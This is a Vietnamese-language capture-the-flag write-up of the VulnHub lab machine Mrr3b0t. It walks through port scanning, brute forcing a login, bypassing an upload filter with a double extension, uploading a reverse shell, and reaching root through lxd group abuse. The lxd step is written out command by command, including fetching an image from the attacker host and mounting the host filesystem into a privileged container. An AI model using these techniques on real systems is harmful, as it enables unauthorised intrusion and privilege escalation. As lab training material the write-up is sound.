---
title: "Bizarre Adventure: Mrr3b0t Writeup - VulnHub"
categories:
  - CTF Writeup
  - VulnHub
tags:
  - hacking
date: "2023-08-22 10:30:00"
published: true
---

Download: [Bizarre Adventure: Mrr3b0t VulnHub](https://www.vulnhub.com/entry/bizarre-adventure-mrr3b0t,561/){:target="\_blank"}

## Network Scanning

```shell
arp-scan -l
```

![ip scan](https://ik.imagekit.io/dyl4n/posts/mrr3b0t/ip.png)
_scan ip machine_

```shell
nmap 10.0.2.18 -p- -sC -sV
```

```shell
┌──(kali㉿kali)-[~]
└─$ nmap 10.0.2.18 -p- -sC -sV
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 00:15 EDT
Nmap scan report for 10.0.2.18
Host is up (0.0012s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 98:b7:f5:6b:0d:58:1d:7b:58:7d:1a:99:fb:b1:8f:04 (RSA)
|   256 66:b4:4b:40:e6:c9:76:93:31:aa:fc:ff:9a:40:a9:f9 (ECDSA)
|_  256 55:c6:b2:01:0f:16:1c:68:96:e2:bb:b1:fe:ff:59:c2 (ED25519)
53/tcp   open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Eskwela Template
|_http-server-header: Apache/2.4.29 (Ubuntu)
5355/tcp open  llmnr?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 149.34 seconds
```

Quét được 4 cổng đang open, trong đó có 2 cổng đã quá quen thuộc 80 http và 20 ssh. Thử đi vào cổng 80 dịch vụ web:

![web service](https://ik.imagekit.io/dyl4n/posts/mrr3b0t/web-service.png)

## Enumeration

```shell
gobuster dir -u http://10.0.2.18/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

![gobuster](https://ik.imagekit.io/dyl4n/posts/mrr3b0t/gobuster.png)

Quét ra một số thư mục, trong đó có `/administrator` là 1 trang đăng nhập. Chưa có thông tin nên ta tiếp tục khai phá các thư mục còn lại xem tìm kiếm được gì không. Trong thư mục `/images`, phát hiện được 1 số tập tin hay ho:

```
flag.txt.txt	2020-09-16 18:53	43
hidden.png	2020-09-16 18:52	91K
```

## Exploitation

```
┌──(kali㉿kali)-[~]
└─$ curl 10.0.2.18/images/flag.txt.txt
Almost!

Did you notice something hidden?
```

Vậy là có thể thứ ta cần tìm sẽ nằm ở file `hidden.png` kia.

```shell
zsteg hidden.png
```

![zsteg](https://ik.imagekit.io/dyl4n/posts/mrr3b0t/zsteg.png)
_Dùng zsteg extract được 1 dòng text thú vị_

Với thông tin ở trên xác định được username là `mrrobot`, việc còn lại là tìm ra password.

Mở Burp lên và bắt gói tin đăng nhập gửi lên server.

```shell
username=mrrobot&pass=abc
```

Body request cho thấy gói tin để xác thực user gửi lên server với 2 tham số `username`, `pass` và chúng đều được truyền dưới dạng cleartext. Dựa vào điều này ta hoàn toàn có thể bruteforce tham số `pass` với `username` là tham số đã biết.

![password bruteforce](https://ik.imagekit.io/dyl4n/posts/mrr3b0t/password-bruteforce.png)
_Với wordlist có sẵn của Burp ta cũng có thể tìm ra được pass (hoặc một số wordlist thông dụng khác như rockyou.txt...)_

Sau khi login vô `/administrator`, xuất hiện 1 trang upload.

![Wappalyzer](https://ik.imagekit.io/dyl4n/posts/mrr3b0t/programming-language.png)
_Sử dụng Wappalyzer extension quét được một số thông tin, trong đó phát hiện được ngôn ngữ được chạy trên máy chủ là PHP_

Đã biết ngôn ngữ chạy trên server rồi thì bước tiếp theo là tiến hành khai thác xem liệu server có chứa lỗ hổng file upload hay không.

![upload payload](https://ik.imagekit.io/dyl4n/posts/mrr3b0t/upload.png)

Có thể thấy, file php mà ta upload đã bị chặn, thay vào đó server chỉ cho phép upload ảnh có định dạng nằm trong whitelist jpg, jpeg, gif, png.

![poc](https://ik.imagekit.io/dyl4n/posts/mrr3b0t/poc.png)

Có thể phía backend filter không kĩ càng khi tách tên file thành mảng có 2 phần tử phân cách bởi dấu chấm và chỉ xem xét phần tử thứ 2 và coi nó như là đuôi file. Mà.. thằng HTTPD chỉ nhìn vào đuôi cuối cùng của tên file để xem xét có xử lý hay không nên ta có thể dễ dàng bypass như cách trên.

![phpinfo](https://ik.imagekit.io/dyl4n/posts/mrr3b0t/phpinfo.png)

Up reverse shell và tiến hành RCE.

![RCE](https://ik.imagekit.io/dyl4n/posts/mrr3b0t/rce.png)
_RCE thành công_

## Privilege Escalation

```shell
www-data@mrr3b0t:/$ ls /home
ls /home
exploiter
```

Có 1 user trong thư mục home, trước mắt là leo thang lên user này.

### Other user

Trong thư mục lưu trữ source code của apache, ngoài DocumentRoot của web server hiện thời ra, còn sót một thư mục khác có tên `bf`.

```shell
www-data@mrr3b0t:/var/www$ ls
bf  html
```

```shell
www-data@mrr3b0t:/var/www$ cd bf
www-data@mrr3b0t:/var/www/bf$ ls
buffer
www-data@mrr3b0t:/var/www/bf$ file buffer
buffer: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d870ae3a0c4c68f57dede236b914138be4074732, not stripped
```

Thử strings ra xem có gì..

```shell
www-data@mrr3b0t:/var/www/bf$ strings buffer
/lib64/ld-linux-x86-64.so.2
libc.so.6
...
...
...
 Digite a senha:
MrR0b0t121
 Senha errada
 Senha Correta
Password@123
...
...
...
```

Có 1 chuỗi chứa từ khóa Password, khả năng đây là mật khẩu có thể dùng được. Nhưng vẫn chưa chắc chắn về điều này nên tôi cứng đầu bruteforce để tìm ra password cho thằng `exploiter`. Sau gần 3 ngày treo máy zui zui, kết quả tìm ra cũng chính là password mà mình nghi ngờ.

![exploiter password](https://ik.imagekit.io/dyl4n/posts/mrr3b0t/exploiter-password.PNG)

```shell
www-data@mrr3b0t:/var/www/bf$ su exploiter
Password: Password@123

exploiter@mrr3b0t:/var/www/bf$
```

### Root

```shell
exploiter@mrr3b0t:~$ id
uid=1000(exploiter) gid=1000(exploiter) groups=1000(exploiter),24(cdrom),30(dip),46(plugdev),111(lxd),118(lpadmin),119(sambashare)
```

Check id thấy được user này thuộc group 111(lxd), được dùng để tạo và quản lý các containers của Linux. Quá là may, mình có thể leo root nhờ thằng user thuộc lxd group này. Có rất nhiều bài viết nói về trick này rồi, nên mình sẽ không giải thích nhiều (Đọc thêm [tại đây](https://systemweakness.com/linux-privilege-escalation-with-lxd-group-66ea1ac5dbbd){:target="\_blank"})

**Step 1**: Tạo image trên máy local

Clone [saghul/lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder){:target="\_blank"}, sau đó chạy file `lxd-alpine-builder/build-alpine` để tạo một image mới.

```shell
┌──(kali㉿kali)-[~/lxd-alpine-builder]
└─$git clone https://github.com/saghul/lxd-alpine-builder
...
┌──(kali㉿kali)-[~/lxd-alpine-builder]
└─$cd lxd-alpine-builder
┌──(kali㉿kali)-[~/lxd-alpine-builder]
└─$ sudo ./build-alpine
...
```

Sau khi chạy xong sẽ sinh ra một file .tar.gz mới, chạy http server và truyền file qua máy victim để import image.

```shell
┌──(kali㉿kali)-[~/lxd-alpine-builder]
└─$ python3 -m http.server 8000
```

**Step 2**: Khởi tạo lxd và Import image vào máy victim

```shell
exploiter@mrr3b0t:/tmp$ wget http://10.0.2.15:8000/alpine-v3.18-x86_64-20230925_0531.tar.gz
exploiter@mrr3b0t:/tmp$ ls
alpine-v3.18-x86_64-20230925_0531.tar.gz
```

```shell
exploiter@mrr3b0t:/tmp$ lxd init
...
...
exploiter@mrr3b0t:/tmp$ lxc image import alpine-v3.18-x86_64-20230925_0531.tar.gz --alias alpine_image
Image imported with fingerprint: 9f78e02a3c7f2fe0e446fb729fd4a6ad92d16b3a942203416420e1fe92a3c038
exploiter@mrr3b0t:/tmp$ lxc image list
+--------------+--------------+--------+-------------------------------+--------+--------+------------------------------+
|    ALIAS     | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+--------------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| alpine_image | 9f78e02a3c7f | no     | alpine v3.18 (20230925_05:31) | x86_64 | 3.62MB | Sep 25, 2023 at 9:43am (UTC) |
+--------------+--------------+--------+-------------------------------+--------+--------+------------------------------+
```

**Step 3**: Tạo container và gắn vào thư mục /root

```shell
exploiter@mrr3b0t:/tmp$ lxc init alpine_image hehe -c security.privileged=true
```

Việc chúng ta set `security.privileged=true` sẽ giúp duy trì đặc quyền root trong toàn bộ hệ thống victim, kể cả khi thoát khỏi container.

```shell
exploiter@mrr3b0t:/tmp$ lxc list
+------+---------+------+------+------------+-----------+
| NAME |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
+------+---------+------+------+------------+-----------+
| hehe | STOPPED |      |      | PERSISTENT | 0         |
+------+---------+------+------+------------+-----------+
```

Mount container vào thư mục root

```shell
exploiter@mrr3b0t:/tmp$ lxc config device add hehe mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to hehe
```

**Step 4**: start container và thực hiện leo quyền

```shell
exploiter@mrr3b0t:/tmp$ lxc start hehe
exploiter@mrr3b0t:/tmp$ lxc list
+------+---------+------+------+------------+-----------+
| NAME |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
+------+---------+------+------+------------+-----------+
| hehe | RUNNING |      |      | PERSISTENT | 0         |
+------+---------+------+------+------------+-----------+
```

bÙm...

```shell
exploiter@mrr3b0t:/tmp$ lxc exec hehe /bin/sh
~ # id
uid=0(root) gid=0(root)
```

cd tới thư mục /mnt/root, vì file system của victim được mount tại đây.

```shell
# cd /mnt/root/root
/mnt/root/root # ls
flag.txt.txt
/mnt/root/root # cat flag*
cat flag*
                 uuuuuuu
             uu$$$$$$$$$$$uu
          uu$$$$$$$$$$$$$$$$$uu
         u$$$$$$$$$$$$$$$$$$$$$u
        u$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$"   "$$$"   "$$$$$$u
       "$$$$"      u$u       $$$$"
        $$$u       u$u       u$$$
        $$$u      u$$$u      u$$$
         "$$$$uu$$$   $$$uu$$$$"
          "$$$$$$$"   "$$$$$$$"
            u$$$$$$$u$$$$$$$u
             u$"$"$"$"$"$"$u
  uuu        $$u$ $ $ $ $u$$       uuu
 u$$$$        $$$$$u$u$u$$$       u$$$$
  $$$$$uu      "$$$$$$$$$"     uu$$$$$$
u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
$$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
 """      ""$$$$$$$$$$$uu ""$"""
           uuuu ""$$$$$$$$$$uuu
  u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
  $$$$$$$$$$""""           ""$$$$$$$$$$$"
   "$$$$$"                      ""$$$$""
     $$$"                         $$$$"

#This is FLAG#
```
